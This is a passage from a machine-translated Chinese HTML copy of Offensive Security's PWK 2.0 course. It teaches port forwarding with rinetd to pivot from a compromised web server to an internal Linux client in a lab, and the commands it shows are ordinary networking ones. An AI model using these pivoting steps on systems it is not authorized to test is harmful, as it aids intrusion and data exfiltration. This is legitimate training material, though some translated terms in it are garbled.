<div style="position:absolute;top:183469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过不受信任的网络提供安全路径。</font></font></nobr></div>
<div style="position:absolute;top:183502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口转发</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">589</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和隧道概念可能难以消化，因此我们将通过几个</font></font></nobr></div>
<div style="position:absolute;top:183521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设场景，以便更清楚地了解该过程。</font><font style="vertical-align: inherit;">花时间去了解</font></font></nobr></div>
<div style="position:absolute;top:183541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进入下一个场景之前。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:183578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.1 端口转发</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口转发是我们将研究的最简单的流量操纵技术，我们将在其中重定向</font></font></nobr></div>
<div style="position:absolute;top:183639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发往一个 IP 地址和端口的流量到另一个 IP 地址和端口。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:183674;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:183674;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RINETD</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将从一个相对简单的端口转发示例开始，基于以下内容</font></font></nobr></div>
<div style="position:absolute;top:183731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设想。</font></font></nobr></div>
<div style="position:absolute;top:183764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估期间，我们获得了对连接 Internet 的 Linux Web 服务器的 root 访问权限。</font><font style="vertical-align: inherit;">从</font></font></nobr></div>
<div style="position:absolute;top:183783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在那里，我们发现并入侵了内部网络上的 Linux 客户端，从而获得了对</font><i><font style="vertical-align: inherit;">SSH 的</font></i><font style="vertical-align: inherit;">访问权限</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:183802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书。</font></font></nobr></div>
<div style="position:absolute;top:183835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个相当常见的场景中，我们的第一个目标 Linux Web 服务器具有 Internet 连接，但是</font></font></nobr></div>
<div style="position:absolute;top:183854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二台机器，Linux 客户端，没有。</font><font style="vertical-align: inherit;">我们只能通过旋转来访问这个客户端</font></font></nobr></div>
<div style="position:absolute;top:183874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过连接互联网的服务器。</font><font style="vertical-align: inherit;">为了再次转向，这次是从 Linux 客户端，以及</font></font></nobr></div>
<div style="position:absolute;top:183893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始评估内部网络上的其他机器，我们必须能够从</font></font></nobr></div>
<div style="position:absolute;top:183912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的攻击机并根据需要将数据泄露给它。</font><font style="vertical-align: inherit;">由于此客户端无法访问 Internet</font></font></nobr></div>
<div style="position:absolute;top:183932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接，我们必须使用受感染的 Linux Web 服务器作为中间人，两次移动数据并</font></font></nobr></div>
<div style="position:absolute;top:183951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个非常乏味的数据传输过程。</font></font></nobr></div>
<div style="position:absolute;top:183984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用端口转发技术来简化这个过程。</font><font style="vertical-align: inherit;">为了重现这个场景，我们的互联网——</font></font></nobr></div>
<div style="position:absolute;top:184003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接的 Kali Linux 虚拟机将作为受感染的 Linux Web 服务器和我们的</font></font></nobr></div>
<div style="position:absolute;top:184023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用的 Debian Linux box 作为内部的、与 Internet 断开连接的 Linux 客户端。</font><font style="vertical-align: inherit;">我们的环境将</font></font></nobr></div>
<div style="position:absolute;top:184042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来像这样：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:184167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">588 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Tunneling_protocol</font></font></font></nobr></div>
<div style="position:absolute;top:184187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">589 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Port_forwarding</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:184315;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="156"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 156 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:184348;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:185425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:185425;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:185425;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">597</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:184833;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 296：出站过滤阻止我们的下载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:184865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按照配置，我们的Kali机器可以上网，客户端不能。</font><font style="vertical-align: inherit;">我们可以验证</font></font></nobr></div>
<div style="position:absolute;top:184884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 ping </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">google.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">nc -nvv</font></font></b><font style="vertical-align: inherit;">连接到该 IP，</font><font style="vertical-align: inherit;">从我们的 Kali 机器</font><font style="vertical-align: inherit;">连接</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:184904;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216.58.207.142 80 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:184938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping google.com -c 1</font></font></font></b></nobr></div>
<div style="position:absolute;top:184955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PING google.com ( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216.58.207.142</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 56(84) 字节数据。</font></font></nobr></div>
<div style="position:absolute;top:184972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 muc11s03-in-f14.1e100.net ( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216.58.207.142</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 的</font><font style="vertical-align: inherit;">64 字节</font><font style="vertical-align: inherit;">：icmp_seq=1 ttl=128 time=26.4</font></font></nobr></div>
<div style="position:absolute;top:184989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小姐</font></font></nobr></div>
<div style="position:absolute;top:185023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- google.com ping 统计 ---</font></font></nobr></div>
<div style="position:absolute;top:185040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送 1 个数据包，接收 1 个数据包，0% 数据包丢失，时间 0ms</font></font></nobr></div>
<div style="position:absolute;top:185057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rtt min/avg/max/mdev = 26.415/26.415/26.415/0.000 毫秒</font></font></nobr></div>
<div style="position:absolute;top:185091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ root@kali:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nvv 216.58.207.142 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:185108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [216.58.207.142] 80 (http) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:185125;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取/HTTP/1.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/1.0 200 正常</font></font></nobr></div>
<div style="position:absolute;top:185176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期：2019 年 8 月 26 日星期一 15:38:42 GMT</font></font></nobr></div>
<div style="position:absolute;top:185193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过期时间：-1</font></font></nobr></div>
<div style="position:absolute;top:185210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存控制：私有，最大年龄=0</font></font></nobr></div>
<div style="position:absolute;top:185227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:185244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:185263;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 625 - 获取 google.com 的 IP 地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，我们的 Kali 攻击机可以访问 Internet。</font><font style="vertical-align: inherit;">接下来，我们将通过 SSH 连接到</font></font></nobr></div>
<div style="position:absolute;top:185312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入侵 Linux 客户端并从那里测试 Internet 连接，再次使用 Netcat。</font><font style="vertical-align: inherit;">注意</font></font></nobr></div>
<div style="position:absolute;top:185331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们再次使用 IP 地址，因为与 Internet 断开连接的实际内部网络可能没有</font></font></nobr></div>
<div style="position:absolute;top:185351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个有效的外部 DNS。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:185503;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="157"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 157 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:185536;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:186613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:186613;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:186613;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">598</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh student@10.11.0.128</font></font></font></b></nobr></div>
<div style="position:absolute;top:185651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@10.11.0.128 的密码： </font></font></nobr></div>
<div style="position:absolute;top:185668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux debian 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686</font></font></nobr></div>
<div style="position:absolute;top:185685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:185719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nvv 216.58.207.142 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:185752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [216.58.207.142] 80 (http) :</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有到主机的路由</font></font></font></b></nobr></div>
<div style="position:absolute;top:185769;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送 0，接收 0</font></font></nobr></div>
<div style="position:absolute;top:185789;left:197"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 626 - 由于缺乏 Internet 连接而无法连接到外部 IP 地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这次上网测试失败，说明我们的Linux客户端确实断线了</font></font></nobr></div>
<div style="position:absolute;top:185838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自网络。</font><font style="vertical-align: inherit;">为了将文件传输到连接 Internet 的主机，我们必须首先传输</font></font></nobr></div>
<div style="position:absolute;top:185857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将它们发送到 Linux Web 服务器，然后再次将它们传输到我们预定的目的地。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:185919;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，在真实的渗透测试环境中，我们的目标很可能是</font></font></i></nobr></div>
<div style="position:absolute;top:185939;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将文件传输到我们的 Kali 攻击机（不一定像这里那样通过它）</font></font></i></nobr></div>
<div style="position:absolute;top:185958;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">场景），但概念是相同的。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相反，我们将使用名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rinetd </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">590</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的端口转发工具</font><font style="vertical-align: inherit;">来重定向 Kali Linux 服务器上的流量。</font></font></nobr></div>
<div style="position:absolute;top:186039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个工具很容易配置，在 Kali Linux 存储库中可用，并且很容易安装</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt install rinetd</font></font></font></b></nobr></div>
<div style="position:absolute;top:186093;left:287"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 627 - 从 Kali Linux 存储库安装 rinetd</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rinetd 配置文件 /etc/rinetd.conf 列出了需要四个参数的转发规则，</font></font></nobr></div>
<div style="position:absolute;top:186142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bindaddress</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bindport</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它定义了结合的（“听”）的IP地址和端口，并</font></font></nobr></div>
<div style="position:absolute;top:186162;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">connectaddress</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的ConnectPort</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它定义了业务的目的地址和端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/rinetd.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:186213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:186230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#转发规则来了</font></font></nobr></div>
<div style="position:absolute;top:186247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></nobr></div>
<div style="position:absolute;top:186264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 您可以在特定转发规则后指定允许和拒绝规则</font></font></nobr></div>
<div style="position:absolute;top:186281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 仅适用于该转发规则</font></font></nobr></div>
<div style="position:absolute;top:186298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:186315;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 绑定地址绑定端口连接地址连接端口</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:186352;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 628 - rinetd 的默认配置文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用 rinetd 将 Kali Web 服务器在端口 80 上收到的任何流量重定向到</font></font></nobr></div>
<div style="position:absolute;top:186400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在测试中使用的 google.com IP 地址。</font><font style="vertical-align: inherit;">为此，我们将编辑 rinetd 配置文件</font></font></nobr></div>
<div style="position:absolute;top:186419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并指定以下转发规则：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/rinetd.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:186471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:186488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 绑定地址绑定端口连接地址连接端口</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:186563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">590 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Thomas Boutell, 2019), https://boutell.com/rinetd/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:186691;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="158"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 158 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:186724;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:187801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:187801;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:187801;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">599</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:186820;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0 80 216.58.207.142 80</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:186856;left:260"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 629 - 将转发规则添加到 rinetd 配置文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该规则规定，所有在 Kali Linux 服务器的端口 80 上接收的流量，在所有接口上侦听</font></font></nobr></div>
<div style="position:absolute;top:186904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(0.0.0.0)，无论目的地址如何，都会被重定向到 216.58.207.142:80。</font><font style="vertical-align: inherit;">这正是</font></font></nobr></div>
<div style="position:absolute;top:186924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想要什么。</font><font style="vertical-align: inherit;">我们可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">service</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重启rinetd服务，</font><font style="vertical-align: inherit;">确认服务是</font></font></nobr></div>
<div style="position:absolute;top:186943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听 TCP 端口 80 </font><font style="vertical-align: inherit;">（套接字统计信息）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo service rinetd restart</font></font></font></b></nobr></div>
<div style="position:absolute;top:187012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -antp | </font><font style="vertical-align: inherit;">grep "80"</font></font></font></b></nobr></div>
<div style="position:absolute;top:187029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 5 0.0.0.0:80 0.0.0.0:* 用户:(("rinetd",pid=1886,fd=4))</font></font></nobr></div>
<div style="position:absolute;top:187049;left:229"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 630 - 启动 rinetd 服务并使用 ss 确认端口已绑定</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">端口正在侦听。</font><font style="vertical-align: inherit;">为了验证，我们可以连接到 Kali Linux 虚拟机上的端口 80</font></font></nobr></div>
<div style="position:absolute;top:187097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nvv 10.11.0.4 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:187149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.4] 80 (http) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187166;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取/HTTP/1.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/1.0 200 正常</font></font></nobr></div>
<div style="position:absolute;top:187217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期：2019 年 8 月 26 日星期一 15:46:18 GMT</font></font></nobr></div>
<div style="position:absolute;top:187234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过期时间：-1</font></font></nobr></div>
<div style="position:absolute;top:187251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存控制：私有，最大年龄=0</font></font></nobr></div>
<div style="position:absolute;top:187268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/html；</font><font style="vertical-align: inherit;">字符集=ISO-8859-1</font></font></nobr></div>
<div style="position:absolute;top:187285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">P3P: CP="这不是 P3P 政策！有关详细信息，请参阅 g.co/p3phelp。</font></font></nobr></div>
